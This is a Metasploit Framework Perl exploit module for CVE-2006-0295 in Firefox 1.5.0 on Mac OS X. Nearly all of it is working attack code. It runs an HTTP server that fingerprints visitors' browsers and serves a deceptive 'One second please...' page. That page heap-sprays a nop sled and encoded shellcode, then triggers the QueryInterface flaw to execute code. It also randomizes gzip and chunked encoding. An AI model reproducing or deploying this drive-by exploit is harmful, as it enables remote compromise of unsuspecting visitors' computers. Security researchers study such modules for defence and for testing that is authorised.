##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::firefox_queryinterface_osx;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           => 'Firefox location.QueryInterface() Code Execution (Mac OS X)',
	'Version'        => '$Revision: 1.1 $',
	'Authors'        =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a code execution vulnerability in the Mozilla
	Firefox browser. To reliably exploit this vulnerability, we need to fill
	almost a gigabyte of memory with our nop sled and payload. This module has
	been tested on OS X 10.3 with the stock Firefox 1.5.0 package.
}),

	'Arch'           => [ 'ppc' ],
	'OS'             => [ 'osx' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 1024,
		'BadChars' => "\x00",
		'Keys'     => ['-bind'],
	  },
	'Refs'           =>
	  [
	  	['CVE', '2006-0295'],
	  	['BID', '16476'],
	  	['URL', 'http://www.mozilla.org/security/announce/mfsa2006-04.html'],
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
		[ 'Mozilla Firefox 1.5.0.0 on Mac OS X' ]
	  ],
	
	'Keys'           => [ 'mozilla' ],

	'DisclosureDate' => 'Feb 02 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	);
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = ($self->GetVar('HTTPHOST') eq '0.0.0.0') ?
		Pex::Utils::SourceIP('1.2.3.4') :
		$self->GetVar('HTTPHOST');

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
		

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd->RecvLine(10), 3);
	my $agent;
	
	# Read in the HTTP headers
	while ((my $line = $fd->RecvLine(10))) {
		
		$line =~ s/^\s+|\s+$//g;
		
		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}
	
	my $os = 'Unknown';
	my $vl = ($agent =~ m/\/1\.5$/) ? 'Vulnerable' : 'Not Vulnerable';
	
	$os = 'Linux'     if $agent =~ /Linux/i;
	$os = 'Mac OS X'  if $agent =~ /OS X/i;
	$os = 'Windows'   if $agent =~ /Windows/i;	
	
	
	$self->PrintLine("[*] Client connected from $rhost:$rport ($os/$vl).");
	
	if ($os ne 'Mac OS X') {
		$self->PrintLine("[*] Invalid target for this exploit, trying anyways...");
	} else {
		$self->PrintLine("[*] Sending payload and waiting for execution...");	
	}

	my $res = $fd->Send($self->BuildResponse($self->GenerateHTML()));

	$fd->Close();
}

sub JSUnescapePPC {
	my $self = shift;
	my $data = shift;
	my $code = '';
	
	# Encode the shellcode via %u sequences for JS's unescape() function
	my $idx = 0;
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));	
		$code .= sprintf('%%u%.2x%.2x', $c1, $c2);	
		$idx += 2;
	}
	
	return $code;
}

sub GenerateHTML {
	my $self        = shift;
	my $target      = $self->Targets->[$self->GetVar('TARGET')];
	my $shellcode   = $self->JSUnescapePPC($self->GetVar('EncodedPayload')->Payload);
	my $data        = qq#
<html>
<head>
	<title>One second please...</title>
	<script language="javascript">

		function BodyOnLoad() {
			h = FillHeap();
			location.QueryInterface(eval("Components.interfaces.nsIClassInfo"));
		};
		
		function FillHeap() {
			// Filler
			var m = "";
			var h = "";
			var a = 0;
			
			// Nop sled
			for(a=0; a<(1024*256); a++)
				m += unescape("\%u6060\%u6060");

			// Payload
			m += unescape("$shellcode");
			
			// Repeat
			for(a=0; a<1024; a++)
				h += m;
			
			// Return
			return h;
		}
	</script>
</head>
<body onload="BodyOnLoad()">
</body>
</html>
#;
	return $data;
}

sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: text/html\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}

1;

# milw0rm.com [2006-02-08]
